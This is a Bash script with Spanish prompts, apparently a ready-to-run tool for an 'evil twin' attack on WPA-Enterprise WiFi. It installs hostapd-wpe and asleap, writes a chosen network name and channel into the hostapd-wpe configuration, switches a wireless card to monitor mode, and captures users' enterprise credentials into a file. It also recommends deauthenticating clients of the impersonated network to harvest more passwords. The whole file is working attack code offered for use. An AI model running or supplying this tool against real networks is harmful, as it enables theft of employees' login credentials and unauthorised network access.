#!/bin/bash

clear
figlet "Bienvenido al setup del hacking wifi enterprise"
echo ""
echo                "https://github.com/G0dsp"
echo ""
echo                "The dead thing is beyond us..."
echo ""
if ! [ $(id -u) = 0 ];
 then 
 echo ""
echo "                          No eres root, prueba a poner sudo antes de iniciar la herramienta" 
exit 1 
fi

echo ""
sleep 2
clear
echo "Se recomienda usar un ataque de deautenticacion para llevar acabo una mejor recoleccion de credenciales (a la red que estes suplantando)"
echo ""
sleep 3
clear
echo "                          Vamos a comprobar si los paquetes adecuados estan instalados"
echo ""
wpe=/etc/hostapd-wpe
asl=/usr/bin/asleap

if [ -d "$wpe" ]
then 
echo "          [✓]Hostapd-wpe instalado"
else
echo "          [x]Hostapd-wpe no instalado"
echo "          Procedemos a instalarlo"
sleep 1
apt-get install hostapd-wpe
fi

if [ -f "$asl" ]
then 
echo "          [✓]Asleap instalado"
else
echo "          [x]Asleap no instalado"
echo "          Procedemos a instalarlo"
sleep 1
apt-get install asleap
fi
sleep 3
clear
echo "                      Vamos a cambiar el ssid predefinido!"
echo ""
echo "Como te gustaria llamarlo? (sin espacios a ser posible)"
read -r ssid
sed -i 's/^ssid=.*/ssid='$ssid'/g' /etc/hostapd-wpe/hostapd-wpe.conf
echo ""

echo "                      Vamos a cambiar el canal predefinido!"
echo ""
echo "¿Qué canal te gustaria utilizar? (1-12)"
read -r canal
sed -i 's/^channel=.*/channel='$canal'/g' /etc/hostapd-wpe/hostapd-wpe.conf
echo ""

echo ""
echo "                      Vamos a ver si tienes alguna tarjeta para realizar el ataque!"
echo ""
iwconfig
echo "¿Qué interfaz te gustaria usar?"
read -r wifi
echo ""
airmon-ng start $wifi

echo ""
figlet "Guardando configs"

sleep 2

clear
enterprise=$(find / -name credentials-nc.txt)
figlet "Realizando el ataque de captura pasiva"
figlet "Enterprise Wifi"
echo ""
echo "Este ataque es pasivo, dejelo tanto como quiera para capturar la mayoria"
echo "de contraseñas de Enterprise"
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf -i $wifi >> $enterprise

echo "Todas las credenciales capturadas se han guardado en credentials-nc y en hostapd-wpe.log (para solo las credenciales sin info)"

